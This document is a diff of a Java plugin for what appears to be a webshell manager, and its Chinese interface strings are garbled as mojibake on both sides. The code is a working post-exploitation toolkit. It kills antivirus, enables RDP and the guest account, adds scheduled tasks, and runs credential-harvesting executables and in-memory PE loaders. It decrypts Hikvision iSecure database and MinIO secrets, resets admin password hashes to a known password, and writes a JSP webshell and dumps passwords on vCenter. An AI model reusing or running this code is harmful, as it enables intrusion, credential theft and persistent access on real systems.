@@ -52,33 +52,33 @@ public abstract class NewCmd implements Plugin {
     private JPanel Hikpanel = new JPanel(new BorderLayout());
     private JPanel Vcpanel = new JPanel(new BorderLayout());
     private JTextField cmdTextField = new JTextField(36);
-    private JButton cmdButton = new JButton("ÔËĞĞ");
+    private JButton cmdButton = new JButton("è¿è¡Œ");
     private JButton killButton = new JButton("kill360-2");
-    private JButton netButton = new JButton("³öÍøÌ½²â");
-    private JButton runButton = new JButton("»ñÈ¡É±Èí½ø³Ì");
-    private JButton runButton2 = new JButton("Ìí¼Ó¼Æ»®ÈÎÎñ");
-    private JButton rdpButton = new JButton("²éÕÒrdp¶Ë¿Ú");
-    private JLabel cmdLabel = new JLabel("Ö´ĞĞÃüÁî: ");
-    private JButton runrdpButton = new JButton("¿ªÆôrdp¶Ë¿Ú");
-    private JButton stoprdpButton = new JButton("¹Ø±Õrdp¶Ë¿Ú");
-    private JButton guestButton = new JButton("¼¤»îguest");
-    private JButton informationButton = new JButton("»ñÈ¡ĞÅÏ¢·½·¨1");
-    private JButton informationButton1 = new JButton("»ñÈ¡ĞÅÏ¢·½·¨2");
+    private JButton netButton = new JButton("å‡ºç½‘æ¢æµ‹");
+    private JButton runButton = new JButton("è·å–æ€è½¯è¿›ç¨‹");
+    private JButton runButton2 = new JButton("æ·»åŠ è®¡åˆ’ä»»åŠ¡");
+    private JButton rdpButton = new JButton("æŸ¥æ‰¾rdpç«¯å£");
+    private JLabel cmdLabel = new JLabel("æ‰§è¡Œå‘½ä»¤: ");
+    private JButton runrdpButton = new JButton("å¼€å¯rdpç«¯å£");
+    private JButton stoprdpButton = new JButton("å…³é—­rdpç«¯å£");
+    private JButton guestButton = new JButton("æ¿€æ´»guest");
+    private JButton informationButton = new JButton("è·å–ä¿¡æ¯æ–¹æ³•1");
+    private JButton informationButton1 = new JButton("è·å–ä¿¡æ¯æ–¹æ³•2");
     private RTextArea cmdTextArea = new RTextArea();
-    private JComboBox<String> serviceComboBox = new JComboBox(new String[]{"ÔËĞĞÖĞĞÄ", "WebÇ°Ì¨", "MinIO"});
+    private JComboBox<String> serviceComboBox = new JComboBox(new String[]{"è¿è¡Œä¸­å¿ƒ", "Webå‰å°", "MinIO"});
     private JComboBox<String> VserviceComboBox = new JComboBox(new String[]{"Normal", "Linux", "Windows"});
     private JTextField pathTextField = new JTextField(50);
     private JTextField VpathTextField = new JTextField(50);
-    private JButton getPathButton = new JButton("»ñÈ¡ÏêÇé");
-    private JButton VgetPathButton = new JButton("»ñÈ¡ÏêÇé");
-    private JButton extractInfoButton = new JButton("ÌáÈ¡ĞÅÏ¢");
-    private JButton VextractInfoButton = new JButton("ÌáÈ¡ĞÅÏ¢");
-    private JButton userQueryButton = new JButton("SQL²éÑ¯");
-    private JButton VuserQueryButton = new JButton("ÌáÈ¨Ğ´shell");
-    private JButton resetPasswordButton = new JButton("ÖØÖÃÃÜÂë");
-    private JButton VresetPasswordButton = new JButton("»ñÈ¡ÃÜÂë");
-    private JButton restorePasswordButton = new JButton("»¹Ô­ÃÜÂë");
-    private JButton VrestorePasswordButton = new JButton("»ñÈ¡Cookie");
+    private JButton getPathButton = new JButton("è·å–è¯¦æƒ…");
+    private JButton VgetPathButton = new JButton("è·å–è¯¦æƒ…");
+    private JButton extractInfoButton = new JButton("æå–ä¿¡æ¯");
+    private JButton VextractInfoButton = new JButton("æå–ä¿¡æ¯");
+    private JButton userQueryButton = new JButton("SQLæŸ¥è¯¢");
+    private JButton VuserQueryButton = new JButton("ææƒå†™shell");
+    private JButton resetPasswordButton = new JButton("é‡ç½®å¯†ç ");
+    private JButton VresetPasswordButton = new JButton("è·å–å¯†ç ");
+    private JButton restorePasswordButton = new JButton("è¿˜åŸå¯†ç ");
+    private JButton VrestorePasswordButton = new JButton("è·å–Cookie");
     private RTextArea result1TextArea = new RTextArea();
     private RTextArea Vresult1TextArea = new RTextArea();
     private JTextField dbHostTextField = new JTextField(10);
@@ -97,12 +97,12 @@ public abstract class NewCmd implements Plugin {
     private JTextField vadditionalField1 = new JTextField(40);
     private JTextField additionalField2 = new JTextField(40);
     private JTextField vadditionalField2 = new JTextField(40);
-    private JLabel additionalLabel1 = new JLabel("¸½¼ÓĞÅÏ¢1:");
-    private JLabel vadditionalLabel1 = new JLabel("¸½¼ÓĞÅÏ¢1:");
-    private JLabel additionalLabel2 = new JLabel("¸½¼ÓĞÅÏ¢2:");
-    private JLabel vadditionalLabel2 = new JLabel("¸½¼ÓĞÅÏ¢2:");
-    private JLabel additionalLabel3 = new JLabel("ÓÃÓÚ´æ·Å»¹Ô­µÄÔ­Ê¼ÃÜÂëºÍÑÎ");
-    private JLabel vadditionalLabel3 = new JLabel("ÓÃÓÚ´æ·Å»¹Ô­µÄÔ­Ê¼ÃÜÂëºÍÑÎ");
+    private JLabel additionalLabel1 = new JLabel("é™„åŠ ä¿¡æ¯1:");
+    private JLabel vadditionalLabel1 = new JLabel("é™„åŠ ä¿¡æ¯1:");
+    private JLabel additionalLabel2 = new JLabel("é™„åŠ ä¿¡æ¯2:");
+    private JLabel vadditionalLabel2 = new JLabel("é™„åŠ ä¿¡æ¯2:");
+    private JLabel additionalLabel3 = new JLabel("ç”¨äºå­˜æ”¾è¿˜åŸçš„åŸå§‹å¯†ç å’Œç›");
+    private JLabel vadditionalLabel3 = new JLabel("ç”¨äºå­˜æ”¾è¿˜åŸçš„åŸå§‹å¯†ç å’Œç›");
     private RTextArea memoryPeTextArea = new RTextArea();
     private JLabel argsLabel = new JLabel("args");
     private JLabel readWaitLabel = new JLabel("readWait(ms)");
@@ -113,7 +113,7 @@ public abstract class NewCmd implements Plugin {
     public JTextField executableFileTextField;
     public JButton chooseExecutableFileButton;
     private JPanel memoryPePanel = new JPanel(new BorderLayout());
-    private JLabel excuteFileLabel = new JLabel("×¢Èë½ø³ÌÎÄ¼ş: ");
+    private JLabel excuteFileLabel = new JLabel("æ³¨å…¥è¿›ç¨‹æ–‡ä»¶: ");
     public RTextScrollPane memoryPeTextScrollPane;
     public JLabel executableFileLabel;
     private JTextField excuteFileTextField = new JTextField("C:\\Windows\\System32\\rundll32.exe", 50);
@@ -134,7 +134,7 @@ public abstract class NewCmd implements Plugin {
         commandSplitPane.setTopComponent(commandPanel);
         commandSplitPane.setBottomComponent(new JScrollPane(this.codeTextArea));
         commandSplitPane.setDividerSize(0);
-        tabbedPane.addTab("ÃüÁîÖ´ĞĞ", commandSplitPane);
+        tabbedPane.addTab("å‘½ä»¤æ‰§è¡Œ", commandSplitPane);
         JPanel fscanPanel = new JPanel();
         fscanPanel.add(this.informationButton);
         fscanPanel.add(this.informationButton1);
@@ -142,7 +142,7 @@ public abstract class NewCmd implements Plugin {
         fscanSplitPane.setTopComponent(fscanPanel);
         fscanSplitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
         fscanSplitPane.setDividerSize(0);
-        tabbedPane.addTab("ÄÚÍøĞÅÏ¢»ñÈ¡", fscanSplitPane);
+        tabbedPane.addTab("å†…ç½‘ä¿¡æ¯è·å–", fscanSplitPane);
         this.memoryPePanel = new JPanel();
         this.memoryPePanel.setLayout(new GridLayoutManager(2, 8, new Insets(0, 0, 0, 0), -1, -1));
         this.argsLabel = new JLabel();
@@ -162,23 +162,23 @@ public abstract class NewCmd implements Plugin {
         this.memoryPeTextScrollPane = new RTextScrollPane();
         this.memoryPePanel.add(this.memoryPeTextScrollPane, new GridConstraints(1, 0, 1, 8, 0, 3, 5, 5, (Dimension)null, (Dimension)null, (Dimension)null, 0, false));
         this.memoryPeTextArea = new RTextArea();
-        this.memoryPeTextArea.setText("Ñ¡ÔñÎÄ¼şÃ»ÓÃ,ÊÖ¶¯ÊäÈëÁĞÈç\"D:\\360MoveData\\Users\\nox\\Desktop\\yara.exe\",ÇëÊ¹ÓÃpe2shc.exe×ª»»ÄãĞèÒªÄÚ´æ¼ÓÔØµÄÎÄ¼ş\nÖ´ĞĞÊ±Çë´ø²ÎÊı£¬²»´ø²ÎÊıµÄ»°Ìø×ªµ½shellcodeloaderÈ¥¼ÓÔØpeÔËĞĞ");
+        this.memoryPeTextArea.setText("é€‰æ‹©æ–‡ä»¶æ²¡ç”¨,æ‰‹åŠ¨è¾“å…¥åˆ—å¦‚\"D:\\360MoveData\\Users\\nox\\Desktop\\yara.exe\",è¯·ä½¿ç”¨pe2shc.exeè½¬æ¢ä½ éœ€è¦å†…å­˜åŠ è½½çš„æ–‡ä»¶\næ‰§è¡Œæ—¶è¯·å¸¦å‚æ•°ï¼Œä¸å¸¦å‚æ•°çš„è¯è·³è½¬åˆ°shellcodeloaderå»åŠ è½½peè¿è¡Œ");
         this.memoryPeTextScrollPane.setViewportView(this.memoryPeTextArea);
         this.executableFileLabel = new JLabel();
-        this.executableFileLabel.setText("¿ÉÖ´ĞĞ³ÌĞòÂ·¾¶(ÊÖ¶¯ÊäÈëÂ·¾¶)");
+        this.executableFileLabel.setText("å¯æ‰§è¡Œç¨‹åºè·¯å¾„(æ‰‹åŠ¨è¾“å…¥è·¯å¾„)");
         this.memoryPePanel.add(this.executableFileLabel, new GridConstraints(0, 0, 1, 1, 0, 0, 0, 0, (Dimension)null, (Dimension)null, (Dimension)null, 0, false));
         this.executableFileTextField = new JTextField();
         this.executableArgsTextField.setText("-help");
         this.memoryPePanel.add(this.executableFileTextField, new GridConstraints(0, 1, 1, 1, 8, 1, 4, 0, (Dimension)null, new Dimension(150, -1), (Dimension)null, 0, false));
         this.chooseExecutableFileButton = new JButton();
         this.chooseExecutableFileButton.setHorizontalTextPosition(0);
-        this.chooseExecutableFileButton.setText("Ñ¡ÔñÎÄ¼ş");
+        this.chooseExecutableFileButton.setText("é€‰æ‹©æ–‡ä»¶");
         this.memoryPePanel.add(this.chooseExecutableFileButton, new GridConstraints(0, 2, 1, 1, 0, 1, 3, 0, (Dimension)null, (Dimension)null, (Dimension)null, 0, false));
         JSplitPane memorySplitPane = new JSplitPane(0);
         memorySplitPane.setTopComponent(this.memoryPePanel);
-        tabbedPane.addTab("ÄÚ´æ¼ÓÔØ", memorySplitPane);
+        tabbedPane.addTab("å†…å­˜åŠ è½½", memorySplitPane);
         JPanel topPanel = new JPanel();
-        topPanel.add(new JLabel("Ñ¡Ôñ·şÎñ: "));
+        topPanel.add(new JLabel("é€‰æ‹©æœåŠ¡: "));
         topPanel.add(this.serviceComboBox);
         topPanel.add(this.pathTextField);
         topPanel.add(this.getPathButton);
@@ -222,9 +222,9 @@ public abstract class NewCmd implements Plugin {
         JSplitPane HikSplitPane = new JSplitPane(0);
         HikSplitPane.setTopComponent(this.Hikpanel);
         HikSplitPane.setDividerSize(0);
-        habbedPane.addTab("º£¿µÍşÊÓ", HikSplitPane);
+        habbedPane.addTab("æµ·åº·å¨è§†", HikSplitPane);
         JPanel vcenterPanel = new JPanel();
-        vcenterPanel.add(new JLabel("Ñ¡Ôñ·şÎñ: "));
+        vcenterPanel.add(new JLabel("é€‰æ‹©æœåŠ¡: "));
         vcenterPanel.add(this.VserviceComboBox);
         vcenterPanel.add(this.VpathTextField);
         vcenterPanel.add(this.VgetPathButton);
@@ -281,8 +281,8 @@ public abstract class NewCmd implements Plugin {
         otherButtonSplitPane.setTopComponent(otherButtonsPanel);
         otherButtonSplitPane.setBottomComponent(new JScrollPane(this.cmdTextArea));
         otherButtonSplitPane.setDividerSize(0);
-        tabbedPane.addTab("ºóÉøÍ¸ÀûÓÃ", habbedPane);
-        tabbedPane.addTab("ÆäËû¹¦ÄÜ", otherButtonSplitPane);
+        tabbedPane.addTab("åæ¸—é€åˆ©ç”¨", habbedPane);
+        tabbedPane.addTab("å…¶ä»–åŠŸèƒ½", otherButtonSplitPane);
         this.panel.add(tabbedPane);
     }
 
@@ -292,24 +292,27 @@ public abstract class NewCmd implements Plugin {
         }
 
         if (this.loader == null) {
-            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "Î´ÕÒµ½loader");
-        } else {
-            (new Thread() {
-                public void run() {
-                    try {
-                        File selectdFile = new File(NewCmd.this.executableFileTextField.getText().trim());
-                        String fileString = selectdFile.getAbsolutePath();
-                        int readWait = Integer.parseInt(NewCmd.this.readWaitTextField.getText().trim());
-                        byte[] pe = functions.readInputStreamAutoClose(new FileInputStream(fileString));
-                        NewCmd.this.memoryPeTextArea.append(new String(NewCmd.this.loader.runPe2(NewCmd.this.executableArgsTextField.getText().trim(), pe, readWait)));
-                    } catch (Exception var5) {
-                        GOptionPane.showMessageDialog(UiFunction.getParentFrame(NewCmd.this.panel), var5.getMessage());
-                    }
-
-                }
-            }).start();
+            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "æœªæ‰¾åˆ°loader");
+            return;
         }
-
+        if (this.runExecutableButton != null) {
+            SwingUtilities.invokeLater(() -> this.runExecutableButton.setEnabled(false));
+        }
+        try {
+            File selectdFile = new File(this.executableFileTextField.getText().trim());
+            String fileString = selectdFile.getAbsolutePath();
+            int readWait = Integer.parseInt(this.readWaitTextField.getText().trim());
+            byte[] pe = functions.readInputStreamAutoClose(new FileInputStream(fileString));
+            final String out = new String(this.loader.runPe2(this.executableArgsTextField.getText().trim(), pe, readWait));
+            SwingUtilities.invokeLater(() -> this.memoryPeTextArea.append(out));
+        } catch (Exception var5) {
+            final String msg = var5.getMessage() == null ? var5.getClass().getSimpleName() : var5.getMessage();
+            SwingUtilities.invokeLater(() -> GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), msg));
+        } finally {
+            if (this.runExecutableButton != null) {
+                SwingUtilities.invokeLater(() -> this.runExecutableButton.setEnabled(true));
+            }
+        }
     }
 
     private void informationButtonClick(ActionEvent actionEvent) {
@@ -318,7 +321,7 @@ public abstract class NewCmd implements Plugin {
         }
 
         if (this.loader == null) {
-            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "Î´ÕÒµ½loader");
+            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "æœªæ‰¾åˆ°loader");
         } else {
             byte[] pe = functions.readInputStreamAutoClose(NewCmd.class.getResourceAsStream("assets/Pillager.exe"));
 
@@ -338,7 +341,7 @@ public abstract class NewCmd implements Plugin {
         }
 
         if (this.loader == null) {
-            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "Î´ÕÒµ½loader");
+            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "æœªæ‰¾åˆ°loader");
         } else {
             byte[] pe = functions.readInputStreamAutoClose(NewCmd.class.getResourceAsStream("assets/hunter.exe"));
 
@@ -374,20 +377,20 @@ public abstract class NewCmd implements Plugin {
         String selectedService = (String)this.serviceComboBox.getSelectedItem();
         String rootpath = getRootPath(this.payload.currentDir());
         switch (selectedService) {
-            case "ÔËĞĞÖĞĞÄ":
+            case "è¿è¡Œä¸­å¿ƒ":
                 this.pathTextField.setText(rootpath + "/opsMgrCenter/conf/config.properties");
                 this.additionalLabel1.setText("c_password");
                 this.additionalLabel2.setText("c_salt");
                 break;
-            case "WebÇ°Ì¨":
+            case "Webå‰å°":
                 this.pathTextField.setText(rootpath + "/components/postgresql11linux64.1/conf/config.properties");
                 this.additionalLabel1.setText("user_pwd");
                 this.additionalLabel2.setText("salt");
                 break;
             case "MinIO":
                 this.pathTextField.setText(rootpath + "/components/minio.1/conf/config.properties");
-                this.additionalLabel1.setText("¸½¼ÓĞÅÏ¢1");
-                this.additionalLabel2.setText("¸½¼ÓĞÅÏ¢2");
+                this.additionalLabel1.setText("c_password");
+                this.additionalLabel2.setText("c_salt");
                 break;
             default:
                 this.pathTextField.setText(rootpath + "/opsMgrCenter/conf/config.properties");
@@ -423,7 +426,7 @@ public abstract class NewCmd implements Plugin {
     }
 
     private void SudoButtonClick(ActionEvent actionEvent) {
-        this.Vresult1TextArea.setText("µÈÒ»»á¹Û²ì/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/ÊÇ·ñÉú³É111.jsp\n¼ÓÃÜjava_base64\npass:pass\nkey:key");
+        this.Vresult1TextArea.setText("ç­‰ä¸€ä¼šè§‚å¯Ÿ/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/æ˜¯å¦ç”Ÿæˆ111.jsp\nåŠ å¯†java_base64\npass:pass\nkey:key");
         byte[] pe = functions.readInputStreamAutoClose(NewCmd.class.getResourceAsStream("assets/1.py"));
         this.payload.uploadFile("1.py", pe);
         this.payload.execCommand("python3 1.py");
@@ -443,7 +446,7 @@ public abstract class NewCmd implements Plugin {
         String sql;
         String cmd;
         String result;
-        if ("ÔËĞĞÖĞĞÄ".equals(selectedService)) {
+        if ("è¿è¡Œä¸­å¿ƒ".equals(selectedService)) {
             user_pwd = this.additionalField1.getText();
             salt = this.additionalField2.getText();
             rootpath = getRootPath(this.payload.currentDir());
@@ -456,8 +459,8 @@ public abstract class NewCmd implements Plugin {
             sql = "PGPASSWORD='" + dbPassword + "' ./psql -h " + dbHost + " -p " + dbPort + " -U " + dbUsername + " -d " + dbName + " -c \"UPDATE  center_user SET c_password ='" + user_pwd + "',c_salt = '" + salt + "' WHERE c_username='sysadmin'\"";
             cmd = "sh -c \"cd " + psqlpath + "&&" + sql + "\" 2>&1";
             result = this.payload.execCommand(cmd);
-            this.result1TextArea.setText("ÒÑ»¹Ô­Îª:\nc_password:" + user_pwd + "\nc_salt:" + salt + "\n½á¹û£º" + result);
-        } else if ("WebÇ°Ì¨".equals(selectedService)) {
+            this.result1TextArea.setText("å·²è¿˜åŸä¸º:\nc_password:" + user_pwd + "\nc_salt:" + salt + "\nç»“æœï¼š" + result);
+        } else if ("Webå‰å°".equals(selectedService)) {
             user_pwd = this.additionalField1.getText();
             salt = this.additionalField2.getText();
             rootpath = getRootPath(this.payload.currentDir());
@@ -470,9 +473,9 @@ public abstract class NewCmd implements Plugin {
             sql = "PGPASSWORD='" + dbPassword + "' ./psql -h " + dbHost + " -p " + dbPort + " -U " + dbUsername + " -d " + dbName + " -c \"UPDATE  tb_user SET  user_pwd='" + user_pwd + "',salt = '" + salt + "' WHERE user_name='admin'\"";
             cmd = "sh -c \"cd " + psqlpath + "&&" + sql + "\" 2>&1";
             result = this.payload.execCommand(cmd);
-            this.result1TextArea.setText("ÒÑ»¹Ô­Îª:\nuser_pwd:" + user_pwd + "\nsalt:" + salt + "\n½á¹û£º" + result);
+            this.result1TextArea.setText("å·²è¿˜åŸä¸º:\nuser_pwd:" + user_pwd + "\nsalt:" + salt + "\nç»“æœï¼š" + result);
         } else {
-            this.result1TextArea.setText("Î´Ö§³ÖµÄ·şÎñÀàĞÍ¡£\n");
+            this.result1TextArea.setText("æœªæ”¯æŒçš„æœåŠ¡ç±»å‹ã€‚\n");
         }
 
     }
@@ -490,7 +493,7 @@ public abstract class NewCmd implements Plugin {
         String sql;
         String cmd;
         String result;
-        if ("ÔËĞĞÖĞĞÄ".equals(selectedService)) {
+        if ("è¿è¡Œä¸­å¿ƒ".equals(selectedService)) {
             rootpath = getRootPath(this.payload.currentDir());
             psqlpath = rootpath + "/components/postgresql11linux64.1/bin";
             dbPassword = this.dbPasswordTextField.getText();
@@ -501,9 +504,9 @@ public abstract class NewCmd implements Plugin {
             sql = "PGPASSWORD='" + dbPassword + "' ./psql -h " + dbHost + " -p " + dbPort + " -U " + dbUsername + " -d " + dbName + " -c \"UPDATE  center_user SET c_password ='1909408d3304f41421caae1fd5df984f21d70b516a315d375f94f87861eedc92',c_salt = '938f7ad2436f3084a19dee5dc2e7a513892b696a8069a2f886ada7562226b1cc' WHERE c_username='sysadmin'\"";
             cmd = "sh -c \"cd " + psqlpath + "&&" + sql + "\" 2>&1";
             result = this.payload.execCommand(cmd);
-            output.append("Ä¬ÈÏÖØÖÃÎªsysadmin/hik123456\n");
-            output.append("½á¹û£º" + result);
-        } else if ("WebÇ°Ì¨".equals(selectedService)) {
+            output.append("é»˜è®¤é‡ç½®ä¸ºsysadmin/hik123456\n");
+            output.append("ç»“æœï¼š" + result);
+        } else if ("Webå‰å°".equals(selectedService)) {
             rootpath = getRootPath(this.payload.currentDir());
             psqlpath = rootpath + "/components/postgresql11linux64.1/bin";
             dbPassword = this.dbPasswordTextField.getText();
@@ -514,10 +517,10 @@ public abstract class NewCmd implements Plugin {
             sql = "PGPASSWORD='" + dbPassword + "' ./psql -h " + dbHost + " -p " + dbPort + " -U " + dbUsername + " -d " + dbName + " -c \"UPDATE  tb_user SET  user_pwd='1909408d3304f41421caae1fd5df984f21d70b516a315d375f94f87861eedc92',salt = '938f7ad2436f3084a19dee5dc2e7a513892b696a8069a2f886ada7562226b1cc' WHERE user_name='admin'\"";
             cmd = "sh -c \"cd " + psqlpath + "&&" + sql + "\" 2>&1";
             result = this.payload.execCommand(cmd);
-            output.append("Ä¬ÈÏÖØÖÃÎªadmin/hik123456\n");
-            output.append("½á¹û£º" + result);
+            output.append("é»˜è®¤é‡ç½®ä¸ºadmin/hik123456\n");
+            output.append("ç»“æœï¼š" + result);
         } else {
-            output.append("Î´Ö§³ÖµÄ·şÎñÀàĞÍ¡£\n");
+            output.append("æœªæ”¯æŒçš„æœåŠ¡ç±»å‹ã€‚\n");
         }
 
         this.result1TextArea.setText(output.toString());
@@ -577,7 +580,7 @@ public abstract class NewCmd implements Plugin {
         String[] rows;
         String dataRow;
         String[] columns;
-        if ("ÔËĞĞÖĞĞÄ".equals(selectedService)) {
+        if ("è¿è¡Œä¸­å¿ƒ".equals(selectedService)) {
             rootpath = getRootPath(this.payload.currentDir());
             psqlpath = rootpath + "/components/postgresql11linux64.1/bin";
             dbPassword = this.dbPasswordTextField.getText();
@@ -599,7 +602,7 @@ public abstract class NewCmd implements Plugin {
                     this.additionalField2.setText(columns[4].trim());
                 }
             }
-        } else if ("WebÇ°Ì¨".equals(selectedService)) {
+        } else if ("Webå‰å°".equals(selectedService)) {
             rootpath = getRootPath(this.payload.currentDir());
             psqlpath = rootpath + "/components/postgresql11linux64.1/bin";
             dbPassword = this.dbPasswordTextField.getText();
@@ -622,7 +625,7 @@ public abstract class NewCmd implements Plugin {
                 }
             }
         } else {
-            this.result1TextArea.setText("Î´Ö§³ÖµÄ·şÎñÀàĞÍ¡£\n");
+            this.result1TextArea.setText("æœªæ”¯æŒçš„æœåŠ¡ç±»å‹ã€‚\n");
         }
 
     }
@@ -632,7 +635,7 @@ public abstract class NewCmd implements Plugin {
         byte[] pe = functions.readInputStreamAutoClose(NewCmd.class.getResourceAsStream("assets/a.py"));
         this.payload.uploadFile("a.py", pe);
         String a = this.payload.execCommand("python3 a.py /etc/vmware-vpx/ssl/symkey.dat password.enc password.txt");
-        this.Vresult1TextArea.setText("½âÃÜ³É¹¦,Éú³ÉÎÄ¼şÎªpassword.txt,ÃÜÂëÈçÏÂ£º\n" + a);
+        this.Vresult1TextArea.setText("è§£å¯†æˆåŠŸ,ç”Ÿæˆæ–‡ä»¶ä¸ºpassword.txt,å¯†ç å¦‚ä¸‹ï¼š\n" + a);
     }
 
     private String extractRelevantInfo(String config) {
@@ -641,26 +644,26 @@ public abstract class NewCmd implements Plugin {
         String accessKey;
         String webPort;
         String secretKey;
-        if ("ÔËĞĞÖĞĞÄ".equals(selectedService)) {
+        if ("è¿è¡Œä¸­å¿ƒ".equals(selectedService)) {
             accessKey = extractLineValue(config, "opsmgr.center.port");
-            extracted.append("ÔËĞĞÖĞĞÄ¶Ë¿Ú£º\n").append(accessKey).append("\n\n");
+            extracted.append("è¿è¡Œä¸­å¿ƒç«¯å£ï¼š\n").append(accessKey).append("\n\n");
             webPort = "jdbc:postgresql://" + extractLineValue(config, "opsmgr.database.ip");
             secretKey = extractLineValue(config, "opsmgr.database.port");
             String dbName = extractLineValue(config, "opsmgr.database.dbname");
             String username = extractLineValue(config, "opsmgr.database.username");
             String password = ISECUREController.DecryptData(extractLineValue(config, "opsmgr.database.password"));
-            extracted.append("Êı¾İ¿âÅäÖÃ£º\n").append(webPort).append(":").append(secretKey).append("/").append(dbName).append("?user=").append(username).append("&password=").append(password).append("\n");
+            extracted.append("æ•°æ®åº“é…ç½®ï¼š\n").append(webPort).append(":").append(secretKey).append("/").append(dbName).append("?user=").append(username).append("&password=").append(password).append("\n");
             this.dbHostTextField.setText("127.0.0.1");
             this.dbPortTextField.setText(secretKey);
             this.dbNameTextField.setText(dbName);
             this.dbUsernameTextField.setText(username);
             this.dbPasswordTextField.setText(password);
             this.execSqlTextField.setText("SELECT * FROM \"center_user\" WHERE c_username='sysadmin'");
-        } else if ("WebÇ°Ì¨".equals(selectedService)) {
+        } else if ("Webå‰å°".equals(selectedService)) {
             accessKey = extractLineValue(config, "rdbms.1.port");
             webPort = extractLineValue(config, "rdbms.1.username");
             secretKey = ISECUREController.DecryptData(extractLineValue(config, "rdbms.1.password"));
-            extracted.append("Êı¾İ¿âÅäÖÃ£º\n").append("jdbc:postgresql://127.0.0.1:").append(accessKey).append("/irds_irdsdb?user=").append(webPort).append("&password=").append(secretKey).append("\n");
+            extracted.append("æ•°æ®åº“é…ç½®ï¼š\n").append("jdbc:postgresql://127.0.0.1:").append(accessKey).append("/irds_irdsdb?user=").append(webPort).append("&password=").append(secretKey).append("\n");
             this.dbHostTextField.setText("127.0.0.1");
             this.dbPortTextField.setText(accessKey);
             this.dbNameTextField.setText("irds_irdsdb");
@@ -671,9 +674,9 @@ public abstract class NewCmd implements Plugin {
             accessKey = extractLineValue(config, "minio.1.accessKey");
             webPort = extractLineValue(config, "minio.1.webPort");
             secretKey = ISECUREController.DecryptData(extractLineValue(config, "minio.1.secretKey"));
-            extracted.append("MinIOÅäÖÃ£º\n").append("¶Ë¿Ú£º").append(webPort).append("\n").append("ÕËºÅ£º").append(accessKey).append("\n").append("ÃÜÂë£º").append(secretKey).append("\n");
+            extracted.append("MinIOé…ç½®ï¼š\n").append("ç«¯å£ï¼š").append(webPort).append("\n").append("è´¦å·ï¼š").append(accessKey).append("\n").append("å¯†ç ï¼š").append(secretKey).append("\n");
         } else {
-            extracted.append("Î´Ö§³ÖµÄ·şÎñÀàĞÍ¡£\n");
+            extracted.append("æœªæ”¯æŒçš„æœåŠ¡ç±»å‹ã€‚\n");
         }
 
         return extracted.toString();
@@ -732,7 +735,7 @@ public abstract class NewCmd implements Plugin {
             }
         }
 
-        return "Î´ÕÒµ½" + key;
+        return "æœªæ‰¾åˆ°" + key;
     }
 
     private void killButtonClick(ActionEvent actionEvent) {
@@ -759,7 +762,7 @@ public abstract class NewCmd implements Plugin {
                 byte[] pe;
                 String txt2;
                 if (NewCmd.this.payload.getOsInfo().contains("Windows")) {
-                    code = GOptionPane.showInputDialog("ÕâÀïÌîĞ´ÄãµÄudp¼àÌıµÄ·şÎñºÍ¶Ë¿Ú,±ÈÈç:127.0.0.1:8080\nncÊ¹ÓÃ·½·¨ echo 1 | nc -lup 8080", "");
+                    code = GOptionPane.showInputDialog("è¿™é‡Œå¡«å†™ä½ çš„udpç›‘å¬çš„æœåŠ¡å’Œç«¯å£,æ¯”å¦‚:127.0.0.1:8080\nncä½¿ç”¨æ–¹æ³• echo 1 | nc -lup 8080", "");
                     pe = functions.readInputStreamAutoClose(NewCmd.class.getResourceAsStream("assets/netscan.exe"));
                     NewCmd.this.payload.uploadFile(path + "\\netscan.exe", pe);
                     txt2 = NewCmd.this.payload.execCommand(path + "\\netscan.exe -h  " + code);
@@ -768,7 +771,7 @@ public abstract class NewCmd implements Plugin {
                 }
 
                 if (NewCmd.this.payload.getOsInfo().contains("Linux")) {
-                    code = GOptionPane.showInputDialog("ÕâÀïÌîĞ´ÄãµÄudp¼àÌıµÄ·şÎñºÍ¶Ë¿Ú,±ÈÈç:127.0.0.1:8080\nncÊ¹ÓÃ·½·¨ echo 1 | nc -lup 8080", "");
+                    code = GOptionPane.showInputDialog("è¿™é‡Œå¡«å†™ä½ çš„udpç›‘å¬çš„æœåŠ¡å’Œç«¯å£,æ¯”å¦‚:127.0.0.1:8080\nncä½¿ç”¨æ–¹æ³• echo 1 | nc -lup 8080", "");
                     pe = functions.readInputStreamAutoClose(NewCmd.class.getResourceAsStream("assets/netscan"));
                     NewCmd.this.payload.uploadFile(path + "/netscan", pe);
                     txt2 = NewCmd.this.payload.execCommand("chmod +x " + path + "/netscan");
@@ -787,7 +790,7 @@ public abstract class NewCmd implements Plugin {
             public void run() {
                 NewCmd.this.cmdTextArea.setText("");
                 String cmdResult = NewCmd.this.payload.execCommand("tasklist /svc");
